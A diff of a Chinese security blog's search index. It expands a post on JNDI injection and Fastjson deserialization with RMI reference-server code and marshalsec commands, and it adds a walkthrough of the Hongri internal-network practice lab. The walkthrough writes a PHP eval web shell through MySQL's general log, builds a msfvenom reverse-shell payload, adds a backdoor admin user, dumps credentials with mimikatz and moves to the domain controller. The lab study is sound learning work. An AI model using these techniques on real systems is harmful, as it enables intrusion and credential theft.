@@ -2420,10 +2420,22 @@ echo 123;
   <entry>
     <title>JNDI注入</title>
     <url>/2022/03/31/JNDI%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="JNDI注入与Fastjson反序列化"><a href="#JNDI注入与Fastjson反序列化" class="headerlink" title="JNDI注入与Fastjson反序列化"></a>JNDI注入与Fastjson反序列化</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/7027#toc-5">https://xz.aliyun.com/t/7027#toc-5</a></p>
+    <content><![CDATA[<h1 id="JNDI注入与Fastjson反序列化"><a href="#JNDI注入与Fastjson反序列化" class="headerlink" title="JNDI注入与Fastjson反序列化"></a>JNDI注入与Fastjson反序列化</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/7027#toc-5">https://xz.aliyun.com/t/7027#toc-5</a><br><a href="https://evilpan.com/2021/12/13/jndi-injection/#jndi-101">https://evilpan.com/2021/12/13/jndi-injection/#jndi-101</a></p>
 <h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDI全名为``Java Naming and Directory Interface<code>，</code>Java命名和目录接口<code>。通过JNDI这个接口，可以调用如LDAP, RMI, DNS, NIS，许多种服务。在JNDI中通过</code>Lookup(url)<code>去调用远程代码。如果我们可以控制</code>url`参数，更改为恶意远程服务器地址。可以通过JNDI配合RMI和LDAP让服务端运行我们部署在公网上的恶意类。</p>
+<p>通过JNDI的名称知道，JNDI是提供<code>Naming</code> 和<code>Directory</code>的接口服务。但是<code>Naming</code>和<code>Directory</code>又分别是什么东西。</p>
 <span id="more"></span>
 
+<h3 id="Naming"><a href="#Naming" class="headerlink" title="Naming"></a>Naming</h3><p><code>Naming</code>这个地方实际上指的是<code>Naming Service</code><strong>名称服务</strong>，通过名称找到对应的目标。例如:</p>
+<ul>
+<li>DNS服务通过域名查找ip</li>
+<li>文件系统通过目录找到具体的文件</li>
+</ul>
+<p>同样有一个重要的名称服务<code>LDAP</code>(Lightweight Directory Access Protocol)，轻量级目录访问协议。它的协议格式是从又往左进行逐级定义，以<code>,</code>为分隔符，每一级为<code>name=value</code>的键值对。比如:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cn=john,o=Sun,c=us</span><br></pre></td></tr></table></figure>
+<p>意为在c=us的域中查找o=Sun的子域，在o=Sun的子域中再去查找cn=john的对象。</p>
+<p>同时在名称系统中有几个重要的概念。<br><strong>Bindings</strong>:表示名称和对象的绑定关系，比如通过域名绑定ip,通过目录绑定文件<br><strong>Context</strong>:上下文。一个上下文对应这一个绑定，通过指定的上下文来查找唯一的对象。在文件系统中，一个目录就是一个上下文，其中的目录也称为子上下文(Subcontext)<br><strong>References</strong>:在一个实际的名称系统中，对象可能无法直接存储在系统中，这时需要通过类似于引用的关系进行调用。类似于指针</p>
+<h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><p>目录系统是名称系统的扩展，可以对于名称系统中具体对象的属性进行增删改查。关键就在于通过属性的查询到具体的对象。Naming只能通过名称找到对应的对象，但是通过Directory就可以通过对象中的属性来找到对象。域中的AD就是经典的Directory服务。</p>
+<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>通过JNDI。JAVA可以与不同的目录服务提供统一的接口，JNDI的架构如下。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220618152827.png"><br>用户通过API使用目录服务，而厂商通过编写SPI来适配目录服务，用户不需要重复修改代码。</p>
 <h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>通过RMI可以让用户调用远程服务器上的代码，但是一般RMI是将数据发送到服务端实现代码的远程调用。但是如果RMI通过一个<code>Reference类</code>绑定一个外部远程对象。如果用户在当前目录没有这个对象，这用户将通过<code>Reference</code>中设置的远程地址和<code>Factory</code>去引用远程外部类，并且实例化。</p>
 <p>服务端代码</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Registry registry= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">            Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;whatever&quot;</span>, <span class="string">&quot;jndi.Calc&quot;</span>, <span class="string">&quot;http://localhost/&quot;</span>);</span><br><span class="line">            ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(<span class="string">&quot;calc&quot;</span>, wrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -2450,9 +2462,19 @@ echo 123;
 <p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416151229.png"></p>
 <p>当删除文件夹中的clac.class文件，再次运行。这次在日志中就出现了对应的访问记录。</p>
 <p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416152058.png"></p>
-<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>暂时没看</p>
+<h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>与RMI类似通过引用外部实例达到RCE的效果。</p>
+<h3 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h3><p>可以使用marshalsec达到快速开启LDAP和RMI服务的效果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rmi</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8080/文件夹/#ExportObject 8088</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>#</code>后面填写你的恶意类的类名，它会自动绑定URI，8088是你开启rmi服务的端口号，如果不加端口号，它的默认端口号为1099.恶意类建议使用jdk1.6编译</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldap</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8080/文件夹/#ExportObject 8088</span><br></pre></td></tr></table></figure>
+<p>ldap默认端口为1389</p>
+<p>在Client访问的时候，url后可以接任意文件名，marshalsec会自动绑定。 但是需要确保启动服务时的文件名，与web目录中文件名对应.<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220618165238.png"></p>
+<h3 id="JNDI注入和版本的关系"><a href="#JNDI注入和版本的关系" class="headerlink" title="JNDI注入和版本的关系"></a>JNDI注入和版本的关系</h3><p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220618160947.png"></p>
 <h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
-<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>序列化:  <code>Stirng text =  JSON.toJSONString(obj)</code></p>
+<h3 id="API-1"><a href="#API-1" class="headerlink" title="API"></a>API</h3><p>序列化:  <code>Stirng text =  JSON.toJSONString(obj)</code></p>
 <p>反序列化:</p>
 <ol>
 <li><code>obj = JSON.parse(text)  //解析为JSONobject 类型或者 JSONArray类型</code></li>
@@ -3777,6 +3799,50 @@ echo 123;
         <tag>内网</tag>
         <tag>笔记</tag>
         <tag>权限维持</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>中日靶场1</title>
+    <url>/2022/06/14/%E4%B8%AD%E6%97%A5%E9%9D%B6%E5%9C%BA1/</url>
+    <content><![CDATA[<h1 id="红日内网靶场1"><a href="#红日内网靶场1" class="headerlink" title="红日内网靶场1"></a>红日内网靶场1</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>所有机器密码:hongrisec@2019</p>
+<p>win2008修改密码 : hongrisec@2022<br>win7修改密码 : hongrisec@2022</p>
+<span id="more"></span>
+
+<h3 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h3><p>win7<br>VM2 : 192.168.1.12<br>VM4 : 192.168.53.139</p>
+<p>win2008(DC)<br>VM4 : 192.168.53.138</p>
+<p>win2003:<br>VM4: 192.168.53.141</p>
+<p>kali:<br>VM2:192.168.1.6</p>
+<h3 id="其他设置"><a href="#其他设置" class="headerlink" title="其他设置"></a>其他设置</h3><p>win7 开启phpstudy </p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>2008和2003互通。win7 ping 03 08 可连通。</p>
+<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>第一次win7启动phpstudy失败。重启后修改密码，成功启动</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>先nmap扫描win7。开放80 , 3306端口<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220614154524.png"><br>进入80端口，首页是php探针页面<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220614154554.png"><br>dirsearch扫描后。发现phpmyadmin页面。尝试默认密码root:root。进入phpmyadmin页面<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220614155102.png"></p>
+<p>网络上查询phpmyadmin拿shell有两个方式</p>
+<p>1.通过执行sql语句直接写shell。<br>条件:</p>
+<ul>
+<li>对web目录具有写权限</li>
+<li>知道网站决定路径</li>
+<li><code>secure_file_priv</code>没有具体值</li>
+</ul>
+<p>通过<code>show global variables like &#39;%secure%&#39;;</code>查看站点<code>file_priv</code>值为null。无法直接写Shell<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220614155958.png"></p>
+<p>2.通过mysql全局日志写Shell<br>查看日志配置<br><code>SHOW VARIABLES LIKE &#39;%general%&#39;</code><br>当前全局日志关闭.记录当前全局日志位置为:<br><code>C:\phpStudy\MySQL\data\stu1.log</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220614155912.png"></p>
+<p>开启全局日志<br><code>set global general_log = on;</code><br>修改目录位置为shell地址<br><code>set global general_log_file=&#39;C:\\phpStudy\\WWW\\shell.php&#39;;</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220614161338.png"><br>同时访问<code>192.168.1.12/shell.php</code>可以访问到目录内容<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220614161419.png"></p>
+<p>现在写入shell<br><code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</code><br>使用蚁剑可以成功连接<br>现在将日志选项还原到之前的值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\MySQL\\data\\stu1.log&#x27;;</span><br><span class="line">set global general_log = off;</span><br></pre></td></tr></table></figure>
+<p>使用msf生成一个shell并上传到win7<br><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.6 port=4444 -f exe -o /root/shell.exe </code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220614163349.png"><br>使用蚁剑运行shell获得meterpreter shell。</p>
+<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>ipconfig后发现另外的网段192.168.53/24</p>
+<h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><p>使用msf <code>windows/local/service_permissions</code>模块获得目标System权限<br>尝试添加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user test 123.com /add</span><br><span class="line">net localgroup administrators test /add</span><br></pre></td></tr></table></figure>
+<p>使用msf开启RDP <code>post/windows/manage/enable_rdp</code></p>
+<p>使用远程桌面登录到本地计算机，上传mimikatz开始抓密码<br>发现域管理员密码为<code>hongrisec@2022</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220614171256.png"></p>
+<p>使用wmiexec获得DC的system权限</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+        <tag>内网</tag>
+        <tag>红日</tag>
       </tags>
   </entry>
 </search>
